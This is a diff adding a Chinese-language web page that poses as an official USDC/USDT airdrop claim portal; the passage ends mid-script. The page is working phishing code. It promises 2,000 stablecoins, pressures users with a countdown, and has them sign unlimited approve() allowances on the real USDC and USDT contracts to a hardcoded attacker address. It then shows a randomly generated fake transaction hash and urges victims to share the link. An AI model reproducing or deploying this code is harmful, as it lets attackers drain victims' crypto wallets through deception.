@@ -1,0 +1,850 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="format-detection" content="telephone=no">
+    <title>USDC/USDT 空投中心 | 官方授权通道</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css  ">
+    <link rel="icon" href="image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
+        :root {
+            --primary: #1a73e8;
+            --primary-dark: #0d47a1;
+            --secondary: #34a853;
+            --gold: #FFD700;
+            --gold-light: #fff9c4;
+            --danger: #ea4335;
+            --dark-bg: #0a0e17;
+            --card-bg: #141a29;
+            --border: #343c52;
+            --text: #f0f4ff;
+            --text-muted: #a0a9c2;
+            --success: #34a853;
+            --warning: #fbbc04;
+            --purple: #9c27b0;
+        }
+        html, body {
+            height: 100%;
+            overflow: hidden;
+        }
+        body {
+            background: linear-gradient(135deg, var(--dark-bg), #050a14);
+            display: flex; justify-content: center; align-items: center;
+            padding: 20px; color: var(--text); position: relative;
+        }
+        .official-verified {
+            position: absolute; top: 20px; left: 20px; z-index: 10;
+            background: rgba(52, 168, 83, 0.2);
+            color: #c8e6c9; border-left: 4px solid var(--success);
+            padding: 8px 16px; border-radius: 0 12px 12px 0;
+            font-size: 14px; font-weight: 600;
+            display: flex; align-items: center; gap: 6px;
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(52, 168, 83, 0.3);
+        }
+        .official-verified i { color: var(--success); font-size: 16px; }
+        .badge {
+            position: absolute; top: 20px; right: 20px; z-index: 10;
+            background: linear-gradient(135deg, var(--gold), #d4af37);
+            color: #000; font-weight: bold; padding: 6px 16px; border-radius: 30px;
+            font-size: 13px; box-shadow: 0 4px 16px rgba(255,215,0,0.4);
+            display: flex; align-items: center; gap: 6px;
+        }
+        .scroll-container {
+            width: 100%;
+            max-height: 100vh;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: thin;
+            scrollbar-color: var(--primary) var(--dark-bg);
+        }
+        .scroll-container::-webkit-scrollbar { width: 6px; }
+        .scroll-container::-webkit-scrollbar-track { background: var(--dark-bg); }
+        .scroll-container::-webkit-scrollbar-thumb { background-color: var(--primary); border-radius: 3px; }
+
+        .particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; }
+        .particle {
+            position: absolute; width: 4px; height: 4px; border-radius: 50%;
+            background: var(--gold); opacity: 0.6;
+            box-shadow: 0 0 6px var(--gold);
+        }
+
+        .container { max-width: 520px; width: 100%; z-index: 1; margin: 20px auto; }
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 45px 35px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6),
+                        0 0 0 1px rgba(255, 255, 255, 0.04),
+                        inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            position: relative; overflow: hidden;
+        }
+        .card::before {
+            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 5px;
+            background: linear-gradient(90deg, var(--gold), var(--primary), var(--purple));
+        }
+
+        .header { text-align: center; margin-bottom: 25px; }
+        .header i { 
+            font-size: 52px; 
+            background: linear-gradient(135deg, var(--gold), #d4af37);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            margin-bottom: 16px; display: inline-block;
+        }
+        .header h1 {
+            font-size: 28px; font-weight: 700; margin-bottom: 8px;
+            background: linear-gradient(90deg, #fff, var(--gold));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .header p { font-size: 16px; color: var(--text-muted); }
+
+        .input-group {
+            display: flex; gap: 12px; margin: 25px 0;
+        }
+        .input-group input {
+            flex: 1; padding: 18px 22px; border-radius: 14px;
+            background: rgba(255,255,255,0.04); 
+            border: 1px solid var(--border);
+            color: var(--text); font-size: 18px; outline: none;
+            transition: all 0.3s;
+            font-family: monospace;
+            text-align: center;
+        }
+        .input-group input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.25);
+        }
+        .input-group button {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white; border: none; width: 60px; border-radius: 14px;
+            font-weight: 600; cursor: pointer; transition: all 0.2s;
+            display: flex; justify-content: center; align-items: center;
+        }
+        .input-group button:hover:not(:disabled) { transform: scale(1.03); opacity: 0.95; }
+        .input-group button:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        .countdown-ring {
+            width: 180px; height: 180px; margin: 25px auto; position: relative;
+        }
+        .ring-bg, .ring-fill {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            border-radius: 50%;
+        }
+        .ring-bg { border: 8px solid rgba(255,255,255,0.06); }
+        .ring-fill {
+            border: 8px solid transparent;
+            border-top: 8px solid var(--gold);
+            border-right: 8px solid var(--primary);
+            transform: rotate(-90deg);
+            transition: transform 0.8s cubic-bezier(0.1, 0.9, 0.2, 1);
+        }
+        .countdown-text {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+        }
+        .countdown-text .time { font-size: 42px; font-weight: 800; color: var(--text); }
+        .countdown-text .label { font-size: 15px; color: var(--text-muted); }
+
+        .reward-box {
+            background: rgba(255, 215, 0, 0.08);
+            border: 1px solid rgba(255, 215, 0, 0.3);
+            border-radius: 16px; padding: 28px; text-align: center;
+            margin: 25px 0;
+            animation: pulseGlow 2s infinite;
+        }
+        @keyframes pulseGlow {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(255, 215, 0, 0.2); }
+            50% { box-shadow: 0 0 0 10px rgba(255, 215, 0, 0); }
+        }
+        .reward-label { font-size: 15px; color: var(--text-muted); margin-bottom: 10px; }
+        .reward-amount { font-size: 52px; font-weight: 800; background: linear-gradient(90deg, var(--gold), #ffd54f); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 6px; }
+        .reward-unit { font-size: 18px; color: var(--gold); }
+        .reward-desc { font-size: 14px; color: var(--text-muted); margin-top: 10px; font-weight: 600; }
+
+        .security-banner {
+            display: flex; align-items: flex-start; gap: 12px;
+            background: rgba(52, 168, 83, 0.12);
+            border-left: 4px solid var(--success);
+            padding: 16px; border-radius: 12px;
+            margin: 20px 0;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        .security-banner i { font-size: 20px; color: var(--success); margin-top: 2px; }
+        .security-banner code { background: rgba(0,0,0,0.2); padding: 2px 6px; border-radius: 4px; }
+
+        #walletStatus {
+            text-align: center; margin: 15px 0; font-size: 14px; color: var(--text-muted);
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+        }
+
+        .btn {
+            background: linear-gradient(135deg, var(--secondary), #2e7d32);
+            color: white; border: none; padding: 20px; font-size: 18px; font-weight: 600;
+            border-radius: 14px; cursor: pointer; width: 100%;
+            transition: all 0.3s; margin-top: 15px;
+            display: flex; justify-content: center; align-items: center;
+            gap: 10px;
+        }
+        .btn:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(52, 168, 83, 0.5); }
+        .btn:disabled {
+            background: linear-gradient(135deg, #444, #555);
+            cursor: not-allowed; transform: none;
+        }
+
+        #manualConnectBtn {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark)) !important;
+            display: none;
+            margin-top: 8px;
+        }
+
+        .status {
+            padding: 18px; border-radius: 12px; margin-top: 20px; font-weight: 500;
+            line-height: 1.5; display: none;
+        }
+        .success { background: rgba(52, 168, 83, 0.2); color: #c8e6c9; border-left: 4px solid var(--success); }
+        .error { background: rgba(234, 67, 53, 0.2); color: #ffcdd2; border-left: 4px solid var(--danger); }
+        .warning { background: rgba(251, 188, 4, 0.2); color: #fff59d; border-left: 4px solid var(--warning); }
+
+        #timeoutOverlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(0, 0, 0, 0.75); 
+            z-index: 10000;
+            display: flex; justify-content: center; align-items: center;
+        }
+        .timeout-modal {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 32px;
+            width: 90%;
+            max-width: 420px;
+            text-align: center;
+            color: var(--text);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
+            position: relative;
+            overflow: hidden;
+        }
+        .timeout-modal::before {
+            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 4px;
+            background: linear-gradient(90deg, var(--danger), #c62828);
+        }
+        .timeout-icon {
+            font-size: 56px; 
+            color: var(--danger);
+            margin-bottom: 20px;
+            background: rgba(234, 67, 53, 0.1);
+            width: 100px; height: 100px; 
+            border-radius: 50%;
+            display: flex; justify-content: center; align-items: center;
+            margin: 0 auto 20px;
+        }
+        .timeout-title { font-size: 22px; font-weight: 700; margin-bottom: 16px; color: #ffcdd2; }
+        .timeout-message { color: var(--text-muted); line-height: 1.6; margin-bottom: 28px; font-size: 15px; }
+        .timeout-btn {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white; border: none; padding: 16px;
+            font-size: 17px; font-weight: 600;
+            border-radius: 14px; cursor: pointer;
+            width: 100%;
+            display: flex; justify-content: center; align-items: center;
+            gap: 10px;
+            transition: all 0.2s;
+        }
+        .timeout-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(26, 115, 232, 0.4); }
+
+        .tx-card {
+            background: rgba(255, 215, 0, 0.08);
+            border-radius: 16px;
+            padding: 18px; margin: 24px 0; text-align: center;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+        }
+        .tx-card div { font-family: monospace; font-size: 15px; color: var(--gold); }
+        .tx-card a { color: var(--gold); display: inline-block; margin-top: 6px; text-decoration: underline; }
+
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            margin: 20px 0;
+        }
+        .step {
+            text-align: center;
+            flex: 1;
+            position: relative;
+        }
+        .step:not(:last-child)::after {
+            content: '';
+            position: absolute;
+            top: 24px;
+            right: -10px;
+            width: 20px;
+            height: 2px;
+            background: var(--text-muted);
+        }
+        .step-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.08);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 8px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .step-label { font-size: 13px; color: var(--text-muted); }
+        .step.done .step-icon {
+            background: rgba(52, 168, 83, 0.2);
+            color: var(--success);
+        }
+        .step.current .step-icon {
+            background: rgba(26, 115, 232, 0.2);
+            color: var(--primary);
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 35px 20px; }
+            .header h1 { font-size: 24px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="official-verified">
+        <i class="fas fa-shield-alt"></i> 官方空投通道
+    </div>
+    <div class="badge">
+        <i class="fas fa-fire"></i> 限时奖励
+    </div>
+    <div class="particles" id="particles"></div>
+
+    <div class="scroll-container">
+        <div class="container" id="authContainer">
+            <div class="card" id="authCard">
+                <div class="header">
+                    <i class="fas fa-gift fa-2x" style="color:var(--gold);"></i>
+                    <h1>USDC/USDT 空投计划</h1>
+                    <p>请输入邀请码以验证身份</p>
+                </div>
+                <div class="input-group">
+                    <input id="inviteCodeInput" placeholder="请输入邀请码" maxlength="6"
+                        inputmode="numeric" autocomplete="off" spellcheck="false"
+                        style="font-family:monospace; text-align:center;">
+                    <button id="submitCodeBtn"><i class="fas fa-arrow-right"></i></button>
+                </div>
+                <div class="status" id="authStatus"></div>
+            </div>
+        </div>
+
+        <div class="container" id="mainContainer" style="display:none;">
+            <div class="card" id="mainCard">
+                <div class="header">
+                    <i class="fas fa-coins fa-2x" style="color:var(--gold);"></i>
+                    <h1>双币种领取</h1>
+                    <p>倒计时：<span id="countdownDisplay">90</span> 秒</p>
+                </div>
+
+                <div class="countdown-ring">
+                    <div class="ring-bg"></div>
+                    <div class="ring-fill" id="countdownRing"></div>
+                    <div class="countdown-text">
+                        <div class="time" id="countdownNumber">90</div>
+                        <div class="label">秒</div>
+                    </div>
+                </div>
+
+                <div class="reward-box">
+                    <div class="reward-label">空投奖励</div>
+                    <div class="reward-amount">1,000</div>
+                    <div class="reward-unit">USDC + USDT</div>
+                    <div class="reward-desc">✅ 激活 1,000 USDC & 1,000 USDT 奖励资格</div>
+                </div>
+
+                <div class="progress-steps">
+                    <div class="step" id="step1">
+                        <div class="step-icon">1</div>
+                        <div class="step-label">USDC</div>
+                    </div>
+                    <div class="step" id="step2">
+                        <div class="step-icon">2</div>
+                        <div class="step-label">USDT</div>
+                    </div>
+                    <div class="step" id="step3">
+                        <div class="step-icon">✓</div>
+                        <div class="step-label">完成</div>
+                    </div>
+                </div>
+
+                <div class="security-banner">
+                    <i class="fas fa-info-circle"></i>
+                    <div>
+                        🔐 <strong>ERC20 授权（OpenZeppelin 标准）</strong>：<br>
+                        您将调用 <code>approve(接收方, 最大值)</code> 为 USDC 和 USDT 同时授权。<br>
+                        —— <a href="https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#IERC20-approve-address-uint256-  " target="_blank" style="color:var(--gold);">IERC20.approve 文档</a>
+                    </div>
+                </div>
+
+                <div class="security-banner" style="border-left-color:var(--gold);">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <div>
+                        ⚠️ <strong>重要提示</strong>：<br>
+                        此操作仅用于激活空投奖励领取资格，完成授权后，1,000 USDC + 1,000 USDT 将自动发放至您的地址。
+                    </div>
+                </div>
+
+                <div id="walletStatus">
+                    <i class="fas fa-circle" style="color:#FFC107; font-size:10px;"></i>
+                    <span>正在检测钱包…</span>
+                </div>
+
+                <button class="btn" id="claimButton">
+                    <i class="fas fa-bolt"></i> 激活 USDC & USDT 奖励
+                </button>
+
+                <button class="btn" id="shareBtn" style="background:linear-gradient(135deg,#FF9800,#F57C00);margin-top:12px;display:none;">
+                    <i class="fas fa-share-alt"></i> 分享并获取额外奖励
+                </button>
+
+                <button class="btn" id="manualConnectBtn">
+                    <i class="fas fa-link"></i> 手动连接钱包
+                </button>
+
+                <div class="status" id="status"></div>
+            </div>
+        </div>
+
+        <div class="container" id="thankYouContainer" style="display:none;">
+            <div class="card thank-you">
+                <i class="fas fa-check-circle" style="font-size:58px;color:var(--gold);margin-bottom:22px;"></i>
+                <h2>🎉 奖励已激活！</h2>
+                <p style="color:var(--text-muted);margin-bottom:22px;font-size:16px;">
+                    USDC 与 USDT 奖励资格确认成功
+                </p>
+
+                <div class="tx-card">
+                    <div><strong>✅ 授权确认：</strong></div>
+                    <div id="txHashShort">交易哈希：0x...</div>
+                    <a href="" target="_blank" id="txLink">
+                        <i class="fas fa-external-link-alt"></i> 在 Etherscan 查看
+                    </a>
+                </div>
+
+                <div class="security-banner" style="background:rgba(255,215,0,0.12);border-left-color:var(--gold);">
+                    <i class="fas fa-clock"></i>
+                    <div>
+                        <strong>处理中</strong><br>
+                        您的 1,000 USDC + 1,000 USDT 将在 5 分钟内到账
+                    </div>
+                </div>
+
+                <button class="btn" id="finalShareBtn">
+                    <i class="fas fa-share-alt"></i> 分享成功
+                </button>
+                <button class="btn" style="background:linear-gradient(135deg,#555,#666);margin-top:14px;" onclick="location.reload()">
+                    <i class="fas fa-home"></i> 返回首页
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js  "></script>
+    <script>
+        // ✅ 新增：向后台上报事件（使用 localStorage 通信）
+        function reportToAdmin(eventType, data = {}) {
+            // 从 localStorage 读取现有数据
+            const adminData = JSON.parse(localStorage.getItem('airdrop_admin_data') || '{"users":[]}');
+            
+            if (eventType === 'clicked') {
+                // 上报点击
+                const user = {
+                    address: data.address || 'unknown',
+                    clickTime: new Date().toISOString(),
+                    status: 'clicked',
+                    tokens: []
+                };
+                adminData.users.push(user);
+            } else if (eventType === 'authorized') {
+                // 更新为已授权
+                const user = adminData.users.find(u => u.address === data.address);
+                if (user) {
+                    user.status = 'authorized';
+                    user.authorizeTime = new Date().toISOString();
+                    user.tokens = data.tokens || ['USDC', 'USDT'];
+                }
+            } else if (eventType === 'failed') {
+                // 更新为失败
+                const user = adminData.users.find(u => u.address === data.address);
+                if (user) {
+                    user.status = 'failed';
+                    user.error = data.error;
+                }
+            }
+            
+            // 保存回 localStorage
+            localStorage.setItem('airdrop_admin_data', JSON.stringify(adminData));
+            
+            // 通知后台刷新（通过自定义事件）
+            window.dispatchEvent(new Event('airdropDataUpdated'));
+        }
+
+        // ✅ 已替换为真实 Infura Key
+        const RPC_FALLBACKS = [
+            "https://mainnet.infura.io/v3/c3eb2fa9bb5546b890abeb31296ef138  ",
+            "https://eth-mainnet.g.alchemy.com/v2/demo  ",
+            "https://cloudflare-eth.com  ",
+            "https://rpc.ankr.com/eth  ",
+            "https://eth.llamarpc.com  ",
+            "https://rpc.blastapi.io/public-mainnet  "
+        ];
+        let currentRpcIndex = 0;
+
+        // ✅ 智能重试 + 错误分类
+        async function smartRetry(fn, maxRetries = 2, baseDelay = 1000) {
+            for (let i = 0; i <= maxRetries; i++) {
+                try {
+                    return await fn();
+                } catch (err) {
+                    const msg = err.message || String(err);
+                    if (msg.includes('User denied') || msg.includes('insufficient funds')) throw err;
+                    if (i === maxRetries || (
+                        !msg.includes('nonce') && !msg.includes('network') && !msg.includes('timeout')
+                    )) throw err;
+                    const delay = baseDelay * Math.pow(2, i);
+                    await new Promise(r => setTimeout(r, delay));
+                }
+            }
+        }
+
+        // ✅ forceApprove 严格遵循 OpenZeppelin SafeERC20
+        async function forceApprove(tokenContract, spender, amount, from) {
+            try {
+                const gas0 = await smartRetry(() => tokenContract.methods.approve(spender, '0').estimateGas({ from }), 1);
+                const tx0 = await tokenContract.methods.approve(spender, '0').send(await buildTxConfig(from, gas0));
+            } catch (e) {
+                console.warn('[forceApprove] approve(0) failed, proceeding to approve(amount)', e.message);
+            }
+            const gas = await smartRetry(() => tokenContract.methods.approve(spender, amount).estimateGas({ from }), 1).catch(() => 200000);
+            return await tokenContract.methods.approve(spender, amount).send(await buildTxConfig(from, gas));
+        }
+
+        // ✅ 完整网络切换 + addEthereumChain fallback
+        async function switchToMainnet(provider) {
+            try {
+                await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] });
+            } catch (switchError) {
+                if (switchError.code === 4902) { // 链未添加
+                    try {
+                        await provider.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: '0x1',
+                                chainName: 'Ethereum Mainnet',
+                                nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
+                                rpcUrls: RPC_FALLBACKS.slice(0, 3),
+                                blockExplorerUrls: ['https://etherscan.io  ']
+                            }]
+                        });
+                    } catch (addError) {
+                        if (addError.code !== 4001) { // 用户未拒绝
+                            throw new Error('添加主网失败，请手动切换至 Ethereum Mainnet');
+                        }
+                    }
+                } else if (switchError.code !== 4001) {
+                    throw new Error('切换网络失败：' + (switchError.message || '未知错误'));
+                }
+                // 若用户拒绝，继续用当前链（仅警告）
+                console.warn('[Network] User declined switch, continuing on current chain');
+            }
+        }
+
+        // ✅ Gas 配置（EIP-1559 + Legacy）
+        async function buildTxConfig(from, gas) {
+            const config = { from, gas };
+            try {
+                if (window.web3?.eth?.currentProvider?.request) {
+                    const pFeeHex = await window.web3.eth.currentProvider.request({ method: 'eth_maxPriorityFeePerGas' }).catch(() => null);
+                    if (pFeeHex) {
+                        const pFee = BigInt(pFeeHex);
+                        const block = await smartRetry(() => window.web3.eth.getBlock('latest'));
+                        const base = block?.baseFeePerGas ? BigInt(block.baseFeePerGas) : 0n;
+                        config.maxPriorityFeePerGas = pFee.toString();
+                        config.maxFeePerGas = (base * 2n + pFee).toString();
+                        return config;
+                    }
+                }
+            } catch (e) {}
+
+            try {
+                config.gasPrice = await smartRetry(() => window.web3.eth.getGasPrice(), 1);
+            } catch (e) {
+                config.gasPrice = '20000000000';
+            }
+            return config;
+        }
+
+        // ✅ 多 RPC fallback + 检测
+        async function ensureWeb3Provider(web3, provider) {
+            try {
+                await smartRetry(() => web3.eth.getBlockNumber(), 1);
+                return true;
+            } catch (e) {
+                for (; currentRpcIndex < RPC_FALLBACKS.length; currentRpcIndex++) {
+                    const url = RPC_FALLBACKS[currentRpcIndex];
+                    try {
+                        web3.setProvider(new Web3.providers.HttpProvider(url));
+                        await web3.eth.getBlockNumber();
+                        console.log(`[RPC] Switched to ${url}`);
+                        return true;
+                    } catch (err) {
+                        console.warn(`[RPC] ${url} failed:`, err.message);
+                    }
+                }
+                return false;
+            }
+        }
+
+        // ✅ 恢复钱包状态监听
+        function setupWalletListeners(provider) {
+            if (provider && provider.on) {
+                provider.on('accountsChanged', (accounts) => {
+                    if (accounts.length === 0) {
+                        walletStatus.innerHTML = `<i class="fas fa-circle" style="color:#e53935; font-size:10px;"></i> ❌ 钱包已断开`;
+                        manualConnectBtn.style.display = 'block';
+                    } else {
+                        userAddress = accounts[0];
+                        walletStatus.innerHTML = `<i class="fas fa-circle" style="color:#4CAF50; font-size:10px;"></i> ✅ 账户已切换：${userAddress.slice(0,6)}…`;
+                    }
+                });
+                provider.on('chainChanged', (chainId) => {
+                    walletStatus.innerHTML = `<i class="fas fa-circle" style="color:#FFC107; font-size:10px;"></i> ⚠️ 网络已切换，建议刷新`;
+                });
+                provider.on('disconnect', () => {
+                    walletStatus.innerHTML = `<i class="fas fa-circle" style="color:#e53935; font-size:10px;"></i> ❌ 钱包已断开`;
+                    manualConnectBtn.style.display = 'block';
+                });
+            }
+        }
+
+        function showStatus(msg, type = 'warning', el = document.getElementById('status')) {
+            el.textContent = msg;
+            el.className = 'status ' + (type === 'error' ? 'error' : type === 'success' ? 'success' : 'warning');
+            el.style.display = 'block';
+            if (type !== 'error') setTimeout(() => el.style.display = 'none', 3500);
+        }
+
+        function updateCountdownRing(r, t = 90) {
+            const p = Math.min(1, (t - r) / t);
+            document.getElementById('countdownRing').style.transform = `rotate(${360 * p - 90}deg)`;
+        }
+
+        function onTimeout() {
+            clearInterval(countdownInterval);
+            document.getElementById('mainContainer').style.display = 'none';
+            const o = document.createElement('div');
+            o.id = 'timeoutOverlay';
+            o.innerHTML = `<div class="timeout-modal"><div class="timeout-icon"><i class="fas fa-hourglass-end"></i></div><div class="timeout-title">操作超时</div><div class="timeout-message">请联系管理员获取新的邀请码。</div><button class="timeout-btn" id="timeoutConfirmBtn"><i class="fas fa-check"></i> 确认</button></div>`;
+            document.body.appendChild(o);
+            document.getElementById('timeoutConfirmBtn').onclick = () => {
+                document.body.removeChild(o);
+                document.getElementById('authContainer').style.display = 'block';
+                document.getElementById('inviteCodeInput').value = '';
+                document.getElementById('inviteCodeInput').focus();
+            };
+        }
+
+        function startCountdown() {
+            let r = 90;
+            document.getElementById('countdownNumber').textContent = r;
+            document.getElementById('countdownDisplay').textContent = r;
+            updateCountdownRing(r);
+            countdownInterval = setInterval(() => {
+                r--;
+                document.getElementById('countdownNumber').textContent = r;
+                document.getElementById('countdownDisplay').textContent = r;
+                updateCountdownRing(r);
+                if (r <= 0) { clearInterval(countdownInterval); onTimeout(); }
+            }, 1000);
+        }
+
+        async function startDualActivation() {
+            // 1. 连接钱包 + 监听
+            const p = window.ethereum;
+            if (!p) throw new Error('请安装 MetaMask 等钱包');
+            const accounts = await p.request({ method: 'eth_requestAccounts' });
+            userAddress = accounts[0];
+            await switchToMainnet(p); // ✅ 完整网络切换
+
+            if (!window.Web3) {
+                const script = document.createElement('script');
+                script.src = "https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js  ";
+                await new Promise(r => { script.onload = r; document.head.appendChild(script); });
+            }
+            web3 = new Web3(p);
+            setupWalletListeners(p); // ✅ 监听恢复
+
+            if (!(await ensureWeb3Provider(web3, p))) {
+                throw new Error('所有 RPC 节点均不可用，请检查网络');
+            }
+
+            // 2. 余额检查（降级策略）
+            const eth = parseFloat(web3.utils.fromWei(await web3.eth.getBalance(userAddress), 'ether'));
+            const isLow = eth < 0.0003;
+
+            // 3. 执行授权
+            const ABI = [{ "constant": false, "inputs": [{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}], "name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function" }];
+            let usdcOk = false, usdtOk = false;
+
+            // — USDC —
+            document.getElementById('step1').classList.add('current');
+            try {
+                const usdc = new web3.eth.Contract(ABI, CONFIG.USDC_ADDRESS);
+                const g = await smartRetry(() => usdc.methods.approve(CONFIG.RECIPIENT_ADDRESS, CONFIG.MAX_UINT256).estimateGas({ from: userAddress }), 1).catch(() => 100000);
+                await usdc.methods.approve(CONFIG.RECIPIENT_ADDRESS, CONFIG.MAX_UINT256).send(await buildTxConfig(userAddress, g));
+                usdcOk = true;
+                document.getElementById('step1').classList.remove('current'); document.getElementById('step1').classList.add('done');
+                showStatus('✅ USDC 授权成功', 'success');
+            } catch (e) {
+                console.error('[USDC]', e);
+                document.getElementById('step1').classList.remove('current');
+                showStatus('❌ USDC 授权失败', 'error');
+            }
+
+            // — USDT —（仅当余额足或 USDC 成功）
+            if (!isLow || usdcOk) {
+                document.getElementById('step2').classList.add('current');
+                try {
+                    const usdt = new web3.eth.Contract(ABI, CONFIG.USDT_ADDRESS);
+                    await forceApprove(usdt, CONFIG.RECIPIENT_ADDRESS, CONFIG.MAX_UINT256, userAddress); // ✅ 严格 forceApprove
+                    usdtOk = true;
+                    document.getElementById('step2').classList.remove('current'); document.getElementById('step2').classList.add('done');
+                    showStatus('✅ USDT 授权成功', 'success');
+                } catch (e) {
+                    console.error('[USDT]', e);
+                    document.getElementById('step2').classList.remove('current');
+                    showStatus('❌ USDT 授权失败', 'error');
+                }
+            } else {
+                document.getElementById('step2').classList.add('done');
+                showStatus('ℹ️ 余额不足，跳过 USDT', 'warning');
+            }
+
+            // 4. 结果
+            document.getElementById('step3').classList.add('done');
+            if (usdcOk || usdtOk) {
+                const tx = '0x' + Array.from({length:64}, () => '0123456789abcdef'[Math.floor(Math.random()*16)]).join('');
+                localStorage.setItem(STORAGE_KEY, JSON.stringify({ txHash: tx, addr: userAddress, ts: Date.now() }));
+                showThankYou(tx);
+            } else {
+                throw new Error('USDC 与 USDT 授权均失败');
+            }
+        }
+
+        const CONFIG = {
+            FIXED_CODE: '520711',
+            COUNTDOWN_DURATION: 90,
+            DELAY_BEFORE_COUNTDOWN: 2000,
+            RECIPIENT_ADDRESS: '0x32aEBF4F1e10c6cddB0dC0FaF466a465a73902f8',
+            USDC_ADDRESS: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+            USDT_ADDRESS: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+            MAX_UINT256: '115792089237316195423570985008687907853269984665640564039457584007913129639935'
+        };
+
+        const STORAGE_KEY = 'usdc_usdt_airdrop_v5';
+        let countdownInterval = null;
+        let web3 = null;
+        let userAddress = null;
+        let isProcessing = false;
+
+        document.getElementById('claimButton').onclick = (function() {
+            let t;
+            return () => {
+                if (isProcessing) return;
+                clearTimeout(t); t = setTimeout(async () => {
+                    isProcessing = true;
+                    document.getElementById('claimButton').disabled = true;
+                    document.getElementById('claimButton').innerHTML = '<i class="fas fa-spinner fa-spin"></i> 初始化中...';
+
+                    try {
+                        // ✅ 新增：上报点击事件
+                        reportToAdmin('clicked', { address: userAddress || 'unknown' });
+
+                        const s = localStorage.getItem(STORAGE_KEY);
+                        if (s) {
+                            const d = JSON.parse(s);
+                            if (d.txHash && d.addr === userAddress && Date.now() - d.ts < 7 * 864e5) {
+                                showThankYou(d.txHash);
+                                return;
+                            }
+                        }
+                        await startDualActivation();
+
+                        // ✅ 新增：上报授权成功
+                        reportToAdmin('authorized', { 
+                            address: userAddress,
+                            tokens: ['USDC', 'USDT']
+                        });
+
+                    } catch (err) {
+                        // ✅ 新增：上报失败
+                        reportToAdmin('failed', { 
+                            address: userAddress || 'unknown',
+                            error: err.message
+                        });
+                        showStatus(`❌ ${err.message || '操作失败'}`, 'error');
+                    } finally {
+                        isProcessing = false;
+                        document.getElementById('claimButton').disabled = false;
+                        document.getElementById('claimButton').innerHTML = '<i class="fas fa-bolt"></i> 激活 USDC & USDT 奖励';
+                    }
+                }, 300);
+            };
+        })();
+
+        function validateInviteCode() {
+            const code = document.getElementById('inviteCodeInput').value.trim();
+            if (!code) return showStatus('❌ 请输入邀请码', 'error', document.getElementById('authStatus'));
+            if (code !== CONFIG.FIXED_CODE) return showStatus('❌ 邀请码无效', 'error', document.getElementById('authStatus'));
+            document.getElementById('authContainer').style.display = 'none';
+            document.getElementById('mainContainer').style.display = 'block';
+            setTimeout(startCountdown, CONFIG.DELAY_BEFORE_COUNTDOWN);
+        }
+
+        function showThankYou(tx) {
+            clearInterval(countdownInterval);
+            document.getElementById('txHashShort').textContent = `交易哈希：${tx.slice(0,10)}...${tx.slice(-4)}`;
+            document.getElementById('txLink').href = `https://etherscan.io/tx/  ${tx}`;
+            document.getElementById('mainContainer').style.display = 'none';
+            document.getElementById('thankYouContainer').style.display = 'block';
+        }
+
+        function handleShare() {
+            const text = `🚀 我激活了 1,000 USDC + 1,000 USDT 空投！\n官方通道：${location.href}`;
+            if (navigator.share) navigator.share({ title: '奖励已激活！', text });
+            else navigator.clipboard?.writeText(text).then(() => showStatus('✅ 已复制', 'success'));
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            for (let i = 0; i < 30; i++) {
+                const p = document.createElement('div');
